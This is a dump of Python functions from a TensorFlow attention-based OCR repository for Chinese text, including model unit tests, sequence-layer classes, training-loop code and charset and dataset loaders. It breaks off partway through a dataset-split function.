A-bone1/Attention-ocr-Chinese-Version,init_assign_fn,"def init_assign_fn(sess):
    logging.info('Restoring checkpoint(s)')
    sess.run(all_assign_ops, all_feed_dict)"
A-bone1/Attention-ocr-Chinese-Version,use_metric,"def use_metric(name, value_update_tuple):
    names_to_values[name] = value_update_tuple[0]
    names_to_updates[name] = value_update_tuple[1]"
A-bone1/Attention-ocr-Chinese-Version,create_fake_charset,"def create_fake_charset(num_char_classes):
    charset = {}
    for i in xrange(num_char_classes):
        charset[i] = string.printable[i % len(string.printable)]
    return charset"
A-bone1/Attention-ocr-Chinese-Version,setUp,"def setUp(self):
    tf.test.TestCase.setUp(self)
    self.rng = np.random.RandomState([11, 23, 50])
    self.batch_size = 4
    self.image_width = 600
    self.image_height = 30
    self.seq_length = 40
    self.num_char_classes = 72
    self.null_code = 62
    self.num_views = 4
    feature_size = 288
    self.conv_tower_shape = (self.batch_size, 1, 72, feature_size)
    self.features_shape = (self.batch_size, self.seq_length, feature_size)
    self.chars_logit_shape = (self.batch_size, self.seq_length, self.num_char_classes)
    self.length_logit_shape = (self.batch_size, self.seq_length + 1)
    self.initialize_fakes()"
A-bone1/Attention-ocr-Chinese-Version,initialize_fakes,"def initialize_fakes(self):
    self.images_shape = (self.batch_size, self.image_height, self.image_width, 3)
    self.fake_images = tf.constant(self.rng.randint(low=0, high=255, size=self.images_shape).astype('float32'), name='input_node')
    self.fake_conv_tower_np = self.rng.randn(*self.conv_tower_shape).astype('float32')
    self.fake_conv_tower = tf.constant(self.fake_conv_tower_np)
    self.fake_logits = tf.constant(self.rng.randn(*self.chars_logit_shape).astype('float32'))
    self.fake_labels = tf.constant(self.rng.randint(low=0, high=self.num_char_classes, size=(self.batch_size, self.seq_length)).astype('int64'))"
A-bone1/Attention-ocr-Chinese-Version,create_model,"def create_model(self, charset=None):
    return model.Model(self.num_char_classes, self.seq_length, num_views=4, null_code=62, charset=charset)"
A-bone1/Attention-ocr-Chinese-Version,test_char_related_shapes,"def test_char_related_shapes(self):
    ocr_model = self.create_model()
    with self.test_session() as sess:
        endpoints_tf = ocr_model.create_base(images=self.fake_images, labels_one_hot=None)
        sess.run(tf.global_variables_initializer())
        endpoints = sess.run(endpoints_tf)
        self.assertEqual((self.batch_size, self.seq_length, self.num_char_classes), endpoints.chars_logit.shape)
        self.assertEqual((self.batch_size, self.seq_length, self.num_char_classes), endpoints.chars_log_prob.shape)
        self.assertEqual((self.batch_size, self.seq_length), endpoints.predicted_chars.shape)
        self.assertEqual((self.batch_size, self.seq_length), endpoints.predicted_scores.shape)"
A-bone1/Attention-ocr-Chinese-Version,test_predicted_scores_are_within_range,"def test_predicted_scores_are_within_range(self):
    ocr_model = self.create_model()
    (_, _, scores) = ocr_model.char_predictions(self.fake_logits)
    with self.test_session() as sess:
        scores_np = sess.run(scores)
    values_in_range = (scores_np >= 0.0) & (scores_np <= 1.0)
    self.assertTrue(np.all(values_in_range), msg='Scores contains out of the range values %s' % scores_np[np.logical_not(values_in_range)])"
A-bone1/Attention-ocr-Chinese-Version,test_conv_tower_shape,"def test_conv_tower_shape(self):
    with self.test_session() as sess:
        ocr_model = self.create_model()
        conv_tower = ocr_model.conv_tower_fn(self.fake_images)
        sess.run(tf.global_variables_initializer())
        conv_tower_np = sess.run(conv_tower)
        self.assertEqual(self.conv_tower_shape, conv_tower_np.shape)"
A-bone1/Attention-ocr-Chinese-Version,test_model_size_less_then1_gb,"def test_model_size_less_then1_gb(self):
    ocr_model = self.create_model()
    ocr_model.create_base(images=self.fake_images, labels_one_hot=None)
    with self.test_session() as sess:
        tfprof_root = tf.profiler.profile(sess.graph, options=tf.profiler.ProfileOptionBuilder.trainable_variables_parameter())
        model_size_bytes = 4 * tfprof_root.total_parameters
        self.assertLess(model_size_bytes, 1 * 2 ** 30)"
A-bone1/Attention-ocr-Chinese-Version,test_create_summaries_is_runnable,"def test_create_summaries_is_runnable(self):
    ocr_model = self.create_model()
    data = data_provider.InputEndpoints(images=self.fake_images, images_orig=self.fake_images, labels=self.fake_labels, labels_one_hot=slim.one_hot_encoding(self.fake_labels, self.num_char_classes))
    endpoints = ocr_model.create_base(images=self.fake_images, labels_one_hot=None)
    charset = create_fake_charset(self.num_char_classes)
    summaries = ocr_model.create_summaries(data, endpoints, charset, is_training=False)
    with self.test_session() as sess:
        sess.run(tf.global_variables_initializer())
        sess.run(tf.local_variables_initializer())
        tf.tables_initializer().run()
        sess.run(summaries)"
A-bone1/Attention-ocr-Chinese-Version,test_sequence_loss_function_without_label_smoothing,"def test_sequence_loss_function_without_label_smoothing(self):
    model = self.create_model()
    model.set_mparam('sequence_loss_fn', label_smoothing=0)
    loss = model.sequence_loss_fn(self.fake_logits, self.fake_labels)
    with self.test_session() as sess:
        loss_np = sess.run(loss)
    self.assertEqual(loss_np.shape, tuple())"
A-bone1/Attention-ocr-Chinese-Version,encode_coordinates_alt,"def encode_coordinates_alt(self, net):
    """"""An alternative implemenation for the encoding coordinates.

    Args:
      net: a tensor of shape=[batch_size, height, width, num_features]

    Returns:
      a list of tensors with encoded image coordinates in them.
    """"""
    (batch_size, h, w, _) = net.shape.as_list()
    h_loc = [tf.tile(tf.reshape(tf.contrib.layers.one_hot_encoding(tf.constant([i]), num_classes=h), [h, 1]), [1, w]) for i in xrange(h)]
    h_loc = tf.concat([tf.expand_dims(t, 2) for t in h_loc], 2)
    w_loc = [tf.tile(tf.contrib.layers.one_hot_encoding(tf.constant([i]), num_classes=w), [h, 1]) for i in xrange(w)]
    w_loc = tf.concat([tf.expand_dims(t, 2) for t in w_loc], 2)
    loc = tf.concat([h_loc, w_loc], 2)
    loc = tf.tile(tf.expand_dims(loc, 0), [batch_size, 1, 1, 1])
    return tf.concat([net, loc], 3)"
A-bone1/Attention-ocr-Chinese-Version,test_encoded_coordinates_have_correct_shape,"def test_encoded_coordinates_have_correct_shape(self):
    model = self.create_model()
    model.set_mparam('encode_coordinates_fn', enabled=True)
    conv_w_coords_tf = model.encode_coordinates_fn(self.fake_conv_tower)
    with self.test_session() as sess:
        conv_w_coords = sess.run(conv_w_coords_tf)
    (batch_size, height, width, feature_size) = self.conv_tower_shape
    self.assertEqual(conv_w_coords.shape, (batch_size, height, width, feature_size + height + width))"
A-bone1/Attention-ocr-Chinese-Version,test_disabled_coordinate_encoding_returns_features_unchanged,"def test_disabled_coordinate_encoding_returns_features_unchanged(self):
    model = self.create_model()
    model.set_mparam('encode_coordinates_fn', enabled=False)
    conv_w_coords_tf = model.encode_coordinates_fn(self.fake_conv_tower)
    with self.test_session() as sess:
        conv_w_coords = sess.run(conv_w_coords_tf)
    self.assertAllEqual(conv_w_coords, self.fake_conv_tower_np)"
A-bone1/Attention-ocr-Chinese-Version,test_coordinate_encoding_is_correct_for_simple_example,"def test_coordinate_encoding_is_correct_for_simple_example(self):
    shape = (1, 2, 3, 4)
    fake_conv_tower = tf.constant(2 * np.ones(shape), dtype=tf.float32)
    model = self.create_model()
    model.set_mparam('encode_coordinates_fn', enabled=True)
    conv_w_coords_tf = model.encode_coordinates_fn(fake_conv_tower)
    with self.test_session() as sess:
        conv_w_coords = sess.run(conv_w_coords_tf)
    self.assertAllEqual(conv_w_coords[0, :, :, :4], [[[2, 2, 2, 2], [2, 2, 2, 2], [2, 2, 2, 2]], [[2, 2, 2, 2], [2, 2, 2, 2], [2, 2, 2, 2]]])
    self.assertAllEqual(conv_w_coords[0, :, :, 4:], [[[1, 0, 1, 0, 0], [1, 0, 0, 1, 0], [1, 0, 0, 0, 1]], [[0, 1, 1, 0, 0], [0, 1, 0, 1, 0], [0, 1, 0, 0, 1]]])"
A-bone1/Attention-ocr-Chinese-Version,test_alt_implementation_of_coordinate_encoding_returns_same_values,"def test_alt_implementation_of_coordinate_encoding_returns_same_values(self):
    model = self.create_model()
    model.set_mparam('encode_coordinates_fn', enabled=True)
    conv_w_coords_tf = model.encode_coordinates_fn(self.fake_conv_tower)
    conv_w_coords_alt_tf = self.encode_coordinates_alt(self.fake_conv_tower)
    with self.test_session() as sess:
        (conv_w_coords_tf, conv_w_coords_alt_tf) = sess.run([conv_w_coords_tf, conv_w_coords_alt_tf])
    self.assertAllEqual(conv_w_coords_tf, conv_w_coords_alt_tf)"
A-bone1/Attention-ocr-Chinese-Version,test_predicted_text_has_correct_shape_w_charset,"def test_predicted_text_has_correct_shape_w_charset(self):
    charset = create_fake_charset(self.num_char_classes)
    ocr_model = self.create_model(charset=charset)
    with self.test_session() as sess:
        endpoints_tf = ocr_model.create_base(images=self.fake_images, labels_one_hot=None)
        sess.run(tf.global_variables_initializer())
        tf.tables_initializer().run()
        endpoints = sess.run(endpoints_tf)
        self.assertEqual(endpoints.predicted_text.shape, (self.batch_size,))
        self.assertEqual(len(endpoints.predicted_text[0]), self.seq_length)"
A-bone1/Attention-ocr-Chinese-Version,test_text_corresponds_to_ids,"def test_text_corresponds_to_ids(self):
    charset = create_fake_charset(36)
    ids = tf.constant([[17, 14, 21, 21, 24], [32, 24, 27, 21, 13]], dtype=tf.int64)
    charset_mapper = model.CharsetMapper(charset)
    with self.test_session() as sess:
        tf.tables_initializer().run()
        text = sess.run(charset_mapper.get_text(ids))
    self.assertAllEqual(text, ['hello', 'world'])"
A-bone1/Attention-ocr-Chinese-Version,orthogonal_initializer,"def orthogonal_initializer(shape, dtype=tf.float32, *args, **kwargs):
    """"""Generates orthonormal matrices with random values.

  Orthonormal initialization is important for RNNs:
    http://arxiv.org/abs/1312.6120
    http://smerity.com/articles/2016/orthogonal_init.html

  For non-square shapes the returned matrix will be semi-orthonormal: if the
  number of columns exceeds the number of rows, then the rows are orthonormal
  vectors; but if the number of rows exceeds the number of columns, then the
  columns are orthonormal vectors.

  We use SVD decomposition to generate an orthonormal matrix with random
  values. The same way as it is done in the Lasagne library for Theano. Note
  that both u and v returned by the svd are orthogonal and random. We just need
  to pick one with the right shape.

  Args:
    shape: a shape of the tensor matrix to initialize.
    dtype: a dtype of the initialized tensor.
    *args: not used.
    **kwargs: not used.

  Returns:
    An initialized tensor.
  """"""
    del args
    del kwargs
    flat_shape = (shape[0], np.prod(shape[1:]))
    w = np.random.randn(*flat_shape)
    (u, _, v) = np.linalg.svd(w, full_matrices=False)
    w = u if u.shape == flat_shape else v
    return tf.constant(w.reshape(shape), dtype=dtype)"
A-bone1/Attention-ocr-Chinese-Version,get_layer_class,"def get_layer_class(use_attention, use_autoregression):
    """"""A convenience function to get a layer class based on requirements.

  Args:
    use_attention: if True a returned class will use attention.
    use_autoregression: if True a returned class will use auto regression.

  Returns:
    One of available sequence layers (child classes for SequenceLayerBase).
  """"""
    if use_attention and use_autoregression:
        layer_class = AttentionWithAutoregression
    elif use_attention and (not use_autoregression):
        layer_class = Attention
    elif not use_attention and (not use_autoregression):
        layer_class = NetSlice
    elif not use_attention and use_autoregression:
        layer_class = NetSliceWithAutoregression
    else:
        raise AssertionError('Unsupported sequence layer class')
    logging.debug('Use %s as a layer class', layer_class.__name__)
    return layer_class"
A-bone1/Attention-ocr-Chinese-Version,__init__,"def __init__(self, net, labels_one_hot, model_params, method_params):
    """"""Stores argument in member variable for further use.

    Args:
      net: A tensor with shape [batch_size, num_features, feature_size] which
        contains some extracted image features.
      labels_one_hot: An optional (can be None) ground truth labels for the
        input features. Is a tensor with shape
        [batch_size, seq_length, num_char_classes]
      model_params: A namedtuple with model parameters (model.ModelParams).
      method_params: A SequenceLayerParams instance.
    """"""
    self._params = model_params
    self._mparams = method_params
    self._net = net
    self._labels_one_hot = labels_one_hot
    self._batch_size = net.get_shape().dims[0].value
    self._char_logits = {}
    regularizer = slim.l2_regularizer(self._mparams.weight_decay)
    self._softmax_w = slim.model_variable('softmax_w', [self._mparams.num_lstm_units, self._params.num_char_classes], initializer=orthogonal_initializer, regularizer=regularizer)
    self._softmax_b = slim.model_variable('softmax_b', [self._params.num_char_classes], initializer=tf.zeros_initializer(), regularizer=regularizer)"
A-bone1/Attention-ocr-Chinese-Version,get_train_input,"@abc.abstractmethod
def get_train_input(self, prev, i):
    """"""Returns a sample to be used to predict a character during training.

    This function is used as a loop_function for an RNN decoder.

    Args:
      prev: output tensor from previous step of the RNN. A tensor with shape:
        [batch_size, num_char_classes].
      i: index of a character in the output sequence.

    Returns:
      A tensor with shape [batch_size, ?] - depth depends on implementation
      details.
    """"""
    pass"
A-bone1/Attention-ocr-Chinese-Version,get_eval_input,"@abc.abstractmethod
def get_eval_input(self, prev, i):
    """"""Returns a sample to be used to predict a character during inference.

    This function is used as a loop_function for an RNN decoder.

    Args:
      prev: output tensor from previous step of the RNN. A tensor with shape:
        [batch_size, num_char_classes].
      i: index of a character in the output sequence.

    Returns:
      A tensor with shape [batch_size, ?] - depth depends on implementation
      details.
    """"""
    raise AssertionError('Not implemented')"
A-bone1/Attention-ocr-Chinese-Version,unroll_cell,"@abc.abstractmethod
def unroll_cell(self, decoder_inputs, initial_state, loop_function, cell):
    """"""Unrolls an RNN cell for all inputs.

    This is a placeholder to call some RNN decoder. It has a similar to
    tf.seq2seq.rnn_decode interface.

    Args:
      decoder_inputs: A list of 2D Tensors* [batch_size x input_size]. In fact,
        most of existing decoders in presence of a loop_function use only the
        first element to determine batch_size and length of the list to
        determine number of steps.
      initial_state: 2D Tensor with shape [batch_size x cell.state_size].
      loop_function: function will be applied to the i-th output in order to
        generate the i+1-st input (see self.get_input).
      cell: rnn_cell.RNNCell defining the cell function and size.

    Returns:
      A tuple of the form (outputs, state), where:
        outputs: A list of character logits of the same length as
        decoder_inputs of 2D Tensors with shape [batch_size x num_characters].
        state: The state of each cell at the final time-step.
          It is a 2D Tensor of shape [batch_size x cell.state_size].
    """"""
    pass"
A-bone1/Attention-ocr-Chinese-Version,is_training,"def is_training(self):
    """"""Returns True if the layer is created for training stage.""""""
    return self._labels_one_hot is not None"
A-bone1/Attention-ocr-Chinese-Version,char_logit,"def char_logit(self, inputs, char_index):
    """"""Creates logits for a character if required.

    Args:
      inputs: A tensor with shape [batch_size, ?] (depth is implementation
        dependent).
      char_index: A integer index of a character in the output sequence.

    Returns:
      A tensor with shape [batch_size, num_char_classes]
    """"""
    if char_index not in self._char_logits:
        self._char_logits[char_index] = tf.nn.xw_plus_b(inputs, self._softmax_w, self._softmax_b)
    return self._char_logits[char_index]"
A-bone1/Attention-ocr-Chinese-Version,char_one_hot,"def char_one_hot(self, logit):
    """"""Creates one hot encoding for a logit of a character.

    Args:
      logit: A tensor with shape [batch_size, num_char_classes].

    Returns:
      A tensor with shape [batch_size, num_char_classes]
    """"""
    prediction = tf.argmax(logit, axis=1)
    return slim.one_hot_encoding(prediction, self._params.num_char_classes)"
A-bone1/Attention-ocr-Chinese-Version,get_input,"def get_input(self, prev, i):
    """"""A wrapper for get_train_input and get_eval_input.

    Args:
      prev: output tensor from previous step of the RNN. A tensor with shape:
        [batch_size, num_char_classes].
      i: index of a character in the output sequence.

    Returns:
      A tensor with shape [batch_size, ?] - depth depends on implementation
      details.
    """"""
    if self.is_training():
        return self.get_train_input(prev, i)
    else:
        return self.get_eval_input(prev, i)"
A-bone1/Attention-ocr-Chinese-Version,create_logits,"def create_logits(self):
    """"""Creates character sequence logits for a net specified in the constructor.

    A ""main"" method for the sequence layer which glues together all pieces.

    Returns:
      A tensor with shape [batch_size, seq_length, num_char_classes].
    """"""
    with tf.variable_scope('LSTM'):
        first_label = self.get_input(prev=None, i=0)
        decoder_inputs = [first_label] + [None] * (self._params.seq_length - 1)
        lstm_cell = tf.contrib.rnn.LSTMCell(self._mparams.num_lstm_units, use_peepholes=False, cell_clip=self._mparams.lstm_state_clip_value, state_is_tuple=True, initializer=orthogonal_initializer)
        (lstm_outputs, _) = self.unroll_cell(decoder_inputs=decoder_inputs, initial_state=lstm_cell.zero_state(self._batch_size, tf.float32), loop_function=self.get_input, cell=lstm_cell)
    with tf.variable_scope('logits'):
        logits_list = [tf.expand_dims(self.char_logit(logit, i), dim=1) for (i, logit) in enumerate(lstm_outputs)]
    return tf.concat(logits_list, 1)"
A-bone1/Attention-ocr-Chinese-Version,__init__,"def __init__(self, *args, **kwargs):
    super(NetSlice, self).__init__(*args, **kwargs)
    self._zero_label = tf.zeros([self._batch_size, self._params.num_char_classes])"
A-bone1/Attention-ocr-Chinese-Version,get_image_feature,"def get_image_feature(self, char_index):
    """"""Returns a subset of image features for a character.

    Args:
      char_index: an index of a character.

    Returns:
      A tensor with shape [batch_size, ?]. The output depth depends on the
      depth of input net.
    """"""
    (batch_size, features_num, _) = [d.value for d in self._net.get_shape()]
    slice_len = int(features_num / self._params.seq_length)
    net_slice = self._net[:, char_index:char_index + slice_len, :]
    feature = tf.reshape(net_slice, [batch_size, -1])
    logging.debug('Image feature: %s', feature)
    return feature"
A-bone1/Attention-ocr-Chinese-Version,get_eval_input,"def get_eval_input(self, prev, i):
    """"""See SequenceLayerBase.get_eval_input for details.""""""
    del prev
    return self.get_image_feature(i)"
A-bone1/Attention-ocr-Chinese-Version,get_train_input,"def get_train_input(self, prev, i):
    """"""See SequenceLayerBase.get_train_input for details.""""""
    return self.get_eval_input(prev, i)"
A-bone1/Attention-ocr-Chinese-Version,unroll_cell,"def unroll_cell(self, decoder_inputs, initial_state, loop_function, cell):
    """"""See SequenceLayerBase.unroll_cell for details.""""""
    return tf.contrib.legacy_seq2seq.rnn_decoder(decoder_inputs=decoder_inputs, initial_state=initial_state, cell=cell, loop_function=self.get_input)"
A-bone1/Attention-ocr-Chinese-Version,__init__,"def __init__(self, *args, **kwargs):
    super(NetSliceWithAutoregression, self).__init__(*args, **kwargs)"
A-bone1/Attention-ocr-Chinese-Version,get_eval_input,"def get_eval_input(self, prev, i):
    """"""See SequenceLayerBase.get_eval_input for details.""""""
    if i == 0:
        prev = self._zero_label
    else:
        logit = self.char_logit(prev, char_index=i - 1)
        prev = self.char_one_hot(logit)
    image_feature = self.get_image_feature(char_index=i)
    return tf.concat([image_feature, prev], 1)"
A-bone1/Attention-ocr-Chinese-Version,get_train_input,"def get_train_input(self, prev, i):
    """"""See SequenceLayerBase.get_train_input for details.""""""
    if i == 0:
        prev = self._zero_label
    else:
        prev = self._labels_one_hot[:, i - 1, :]
    image_feature = self.get_image_feature(i)
    return tf.concat([image_feature, prev], 1)"
A-bone1/Attention-ocr-Chinese-Version,__init__,"def __init__(self, *args, **kwargs):
    super(Attention, self).__init__(*args, **kwargs)
    self._zero_label = tf.zeros([self._batch_size, self._params.num_char_classes])"
A-bone1/Attention-ocr-Chinese-Version,get_eval_input,"def get_eval_input(self, prev, i):
    """"""See SequenceLayerBase.get_eval_input for details.""""""
    del prev, i
    return self._zero_label"
A-bone1/Attention-ocr-Chinese-Version,get_train_input,"def get_train_input(self, prev, i):
    """"""See SequenceLayerBase.get_train_input for details.""""""
    return self.get_eval_input(prev, i)"
A-bone1/Attention-ocr-Chinese-Version,unroll_cell,"def unroll_cell(self, decoder_inputs, initial_state, loop_function, cell):
    return tf.contrib.legacy_seq2seq.attention_decoder(decoder_inputs=decoder_inputs, initial_state=initial_state, attention_states=self._net, cell=cell, loop_function=self.get_input)"
A-bone1/Attention-ocr-Chinese-Version,__init__,"def __init__(self, *args, **kwargs):
    super(AttentionWithAutoregression, self).__init__(*args, **kwargs)"
A-bone1/Attention-ocr-Chinese-Version,get_train_input,"def get_train_input(self, prev, i):
    """"""See SequenceLayerBase.get_train_input for details.""""""
    if i == 0:
        return self._zero_label
    else:
        return self._labels_one_hot[:, i - 1, :]"
A-bone1/Attention-ocr-Chinese-Version,get_eval_input,"def get_eval_input(self, prev, i):
    """"""See SequenceLayerBase.get_eval_input for details.""""""
    if i == 0:
        return self._zero_label
    else:
        logit = self.char_logit(prev, char_index=i - 1)
        return self.char_one_hot(logit)"
A-bone1/Attention-ocr-Chinese-Version,fake_net,"def fake_net(batch_size, num_features, feature_size):
    return tf.convert_to_tensor(np.random.uniform(size=(batch_size, num_features, feature_size)), dtype=tf.float32)"
A-bone1/Attention-ocr-Chinese-Version,fake_labels,"def fake_labels(batch_size, seq_length, num_char_classes):
    labels_np = tf.convert_to_tensor(np.random.randint(low=0, high=num_char_classes, size=(batch_size, seq_length)))
    return slim.one_hot_encoding(labels_np, num_classes=num_char_classes)"
A-bone1/Attention-ocr-Chinese-Version,create_layer,"def create_layer(layer_class, batch_size, seq_length, num_char_classes):
    model_params = model.ModelParams(num_char_classes=num_char_classes, seq_length=seq_length, num_views=1, null_code=num_char_classes)
    net = fake_net(batch_size=batch_size, num_features=seq_length * 5, feature_size=6)
    labels_one_hot = fake_labels(batch_size, seq_length, num_char_classes)
    layer_params = sequence_layers.SequenceLayerParams(num_lstm_units=10, weight_decay=4e-05, lstm_state_clip_value=10.0)
    return layer_class(net, labels_one_hot, model_params, layer_params)"
A-bone1/Attention-ocr-Chinese-Version,test_net_slice_char_logits_with_correct_shape,"def test_net_slice_char_logits_with_correct_shape(self):
    batch_size = 2
    seq_length = 4
    num_char_classes = 3
    layer = create_layer(sequence_layers.NetSlice, batch_size, seq_length, num_char_classes)
    char_logits = layer.create_logits()
    self.assertEqual(tf.TensorShape([batch_size, seq_length, num_char_classes]), char_logits.get_shape())"
A-bone1/Attention-ocr-Chinese-Version,test_net_slice_with_autoregression_char_logits_with_correct_shape,"def test_net_slice_with_autoregression_char_logits_with_correct_shape(self):
    batch_size = 2
    seq_length = 4
    num_char_classes = 3
    layer = create_layer(sequence_layers.NetSliceWithAutoregression, batch_size, seq_length, num_char_classes)
    char_logits = layer.create_logits()
    self.assertEqual(tf.TensorShape([batch_size, seq_length, num_char_classes]), char_logits.get_shape())"
A-bone1/Attention-ocr-Chinese-Version,test_attention_char_logits_with_correct_shape,"def test_attention_char_logits_with_correct_shape(self):
    batch_size = 2
    seq_length = 4
    num_char_classes = 3
    layer = create_layer(sequence_layers.Attention, batch_size, seq_length, num_char_classes)
    char_logits = layer.create_logits()
    self.assertEqual(tf.TensorShape([batch_size, seq_length, num_char_classes]), char_logits.get_shape())"
A-bone1/Attention-ocr-Chinese-Version,test_attention_with_autoregression_char_logits_with_correct_shape,"def test_attention_with_autoregression_char_logits_with_correct_shape(self):
    batch_size = 2
    seq_length = 4
    num_char_classes = 3
    layer = create_layer(sequence_layers.AttentionWithAutoregression, batch_size, seq_length, num_char_classes)
    char_logits = layer.create_logits()
    self.assertEqual(tf.TensorShape([batch_size, seq_length, num_char_classes]), char_logits.get_shape())"
A-bone1/Attention-ocr-Chinese-Version,get_training_hparams,"def get_training_hparams():
    return TrainingHParams(learning_rate=FLAGS.learning_rate, optimizer=FLAGS.optimizer, momentum=FLAGS.momentum, use_augment_input=FLAGS.use_augment_input)"
A-bone1/Attention-ocr-Chinese-Version,create_optimizer,"def create_optimizer(hparams):
    """"""Creates optimized based on the specified flags.""""""
    if hparams.optimizer == 'momentum':
        optimizer = tf.train.MomentumOptimizer(hparams.learning_rate, momentum=hparams.momentum)
    elif hparams.optimizer == 'adam':
        optimizer = tf.train.AdamOptimizer(hparams.learning_rate)
    elif hparams.optimizer == 'adadelta':
        optimizer = tf.train.AdadeltaOptimizer(hparams.learning_rate)
    elif hparams.optimizer == 'adagrad':
        optimizer = tf.train.AdagradOptimizer(hparams.learning_rate)
    elif hparams.optimizer == 'rmsprop':
        optimizer = tf.train.RMSPropOptimizer(hparams.learning_rate, momentum=hparams.momentum)
    return optimizer"
A-bone1/Attention-ocr-Chinese-Version,train,"def train(loss, init_fn, hparams):
    """"""Wraps slim.learning.train to run a training loop.

  Args:
    loss: a loss tensor
    init_fn: A callable to be executed after all other initialization is done.
    hparams: a model hyper parameters
  """"""
    optimizer = create_optimizer(hparams)
    if FLAGS.sync_replicas:
        replica_id = tf.constant(FLAGS.task, tf.int32, shape=())
        optimizer = tf.LegacySyncReplicasOptimizer(opt=optimizer, replicas_to_aggregate=FLAGS.replicas_to_aggregate, replica_id=replica_id, total_num_replicas=FLAGS.total_num_replicas)
        sync_optimizer = optimizer
        startup_delay_steps = 0
    else:
        startup_delay_steps = 0
        sync_optimizer = None
    train_op = slim.learning.create_train_op(loss, optimizer, summarize_gradients=True, clip_gradient_norm=FLAGS.clip_gradient_norm)
    slim.learning.train(train_op=train_op, logdir=FLAGS.train_log_dir, graph=loss.graph, master=FLAGS.master, is_chief=FLAGS.task == 0, number_of_steps=FLAGS.max_number_of_steps, save_summaries_secs=FLAGS.save_summaries_secs, save_interval_secs=FLAGS.save_interval_secs, startup_delay_steps=startup_delay_steps, sync_optimizer=sync_optimizer, init_fn=init_fn)"
A-bone1/Attention-ocr-Chinese-Version,prepare_training_dir,"def prepare_training_dir():
    if not tf.gfile.Exists(FLAGS.train_log_dir):
        logging.info('Create a new training directory %s', FLAGS.train_log_dir)
        tf.gfile.MakeDirs(FLAGS.train_log_dir)
    elif FLAGS.reset_train_dir:
        logging.info('Reset the training directory %s', FLAGS.train_log_dir)
        tf.gfile.DeleteRecursively(FLAGS.train_log_dir)
        tf.gfile.MakeDirs(FLAGS.train_log_dir)
    else:
        logging.info('Use already existing training directory %s', FLAGS.train_log_dir)"
A-bone1/Attention-ocr-Chinese-Version,calculate_graph_metrics,"def calculate_graph_metrics():
    param_stats = model_analyzer.print_model_analysis(tf.get_default_graph(), tfprof_options=model_analyzer.TRAINABLE_VARS_PARAMS_STAT_OPTIONS)
    return param_stats.total_parameters"
A-bone1/Attention-ocr-Chinese-Version,main,"def main(_):
    prepare_training_dir()
    dataset = common_flags.create_dataset(split_name=FLAGS.split_name)
    model = common_flags.create_model(dataset.num_char_classes, dataset.max_sequence_length, dataset.num_of_views, dataset.null_code)
    hparams = get_training_hparams()
    device_setter = tf.train.replica_device_setter(FLAGS.ps_tasks, merge_devices=True)
    with tf.device(device_setter):
        data = data_provider.get_data(dataset, FLAGS.batch_size, augment=hparams.use_augment_input, central_crop_size=common_flags.get_crop_size())
        endpoints = model.create_base(data.images, data.labels_one_hot)
        total_loss = model.create_loss(data, endpoints)
        model.create_summaries(data, endpoints, dataset.charset, is_training=True)
        init_fn = model.create_init_fn_to_restore(FLAGS.checkpoint, FLAGS.checkpoint_inception)
        if FLAGS.show_graph_stats:
            logging.info('Total number of weights in the graph: %s', calculate_graph_metrics())
        train(total_loss, init_fn, hparams)"
A-bone1/Attention-ocr-Chinese-Version,logits_to_log_prob,"def logits_to_log_prob(logits):
    """"""Computes log probabilities using numerically stable trick.

  This uses two numerical stability tricks:
  1) softmax(x) = softmax(x - c) where c is a constant applied to all
  arguments. If we set c = max(x) then the softmax is more numerically
  stable.
  2) log softmax(x) is not numerically stable, but we can stabilize it
  by using the identity log softmax(x) = x - log sum exp(x)

  Args:
    logits: Tensor of arbitrary shape whose last dimension contains logits.

  Returns:
    A tensor of the same shape as the input, but with corresponding log
    probabilities.
  """"""
    with tf.variable_scope('log_probabilities'):
        reduction_indices = len(logits.shape.as_list()) - 1
        max_logits = tf.reduce_max(logits, reduction_indices=reduction_indices, keep_dims=True)
        safe_logits = tf.subtract(logits, max_logits)
        sum_exp = tf.reduce_sum(tf.exp(safe_logits), reduction_indices=reduction_indices, keep_dims=True)
        log_probs = tf.subtract(safe_logits, tf.log(sum_exp))
    return log_probs"
A-bone1/Attention-ocr-Chinese-Version,variables_to_restore,"def variables_to_restore(scope=None, strip_scope=False):
    """"""Returns a list of variables to restore for the specified list of methods.

  It is supposed that variable name starts with the method's scope (a prefix
  returned by _method_scope function).

  Args:
    methods_names: a list of names of configurable methods.
    strip_scope: if True will return variable names without method's scope.
      If methods_names is None will return names unchanged.
    model_scope: a scope for a whole model.

  Returns:
    a dictionary mapping variable names to variables for restore.
  """"""
    if scope:
        variable_map = {}
        method_variables = slim.get_variables_to_restore(include=[scope])
        for var in method_variables:
            if strip_scope:
                var_name = var.op.name[len(scope) + 1:]
            else:
                var_name = var.op.name
            variable_map[var_name] = var
        return variable_map
    else:
        return {v.op.name: v for v in slim.get_variables_to_restore()}"
A-bone1/Attention-ocr-Chinese-Version,read_charset,"def read_charset(filename, null_character=u'░'):
    """"""Reads a charset definition from a tab separated text file.

  charset file has to have format compatible with the FSNS dataset.

  Args:
    filename: a path to the charset file.
    null_character: a unicode character used to replace '<null>' character. the
      default value is a light shade block '░'.

  Returns:
    a dictionary with keys equal to character codes and values - unicode
    characters.
  """"""
    pattern = re.compile('(\\d+)\\t(.+)')
    charset = {}
    with tf.gfile.GFile(filename) as f:
        for (i, line) in enumerate(f):
            m = pattern.match(line)
            if m is None:
                logging.warning('incorrect charset file. line #%d: %s', i, line)
                continue
            code = int(m.group(1))
            char = m.group(2)
            if char == '<nul>':
                char = null_character
            charset[code] = char
    return charset"
A-bone1/Attention-ocr-Chinese-Version,get_split,"def get_split(split_name, dataset_dir=None, config=None):
    """"""Returns a dataset tuple for FSNS dataset.

  Args:
    split_name: A train/test split name.
    dataset_dir: The base directory of the dataset sources, by default it uses
      a predefined CNS path (see DEFAULT_DATASET_DIR).
    config: A dictionary with dataset configuration. If None - will use the
      DEFAULT_CONFIG.

  Returns:
    A `Dataset` namedtuple.

  Raises:
    ValueError: if `split_name` is not a valid train/test split.
  """"""
    if not dataset_dir:
        dataset_dir = DEFAULT_DATASET_DIR
    if not config:
        config = DEFAULT_CONFIG
    if split_name not in config['splits']:
        raise ValueError('split name %s was not recognized.' % split_name)
    logging.info('Using %s dataset split_name=%s dataset_dir=%s', config['name'], split_name, dataset_dir)
    zero = tf.zeros([1], dtype=tf.int64)
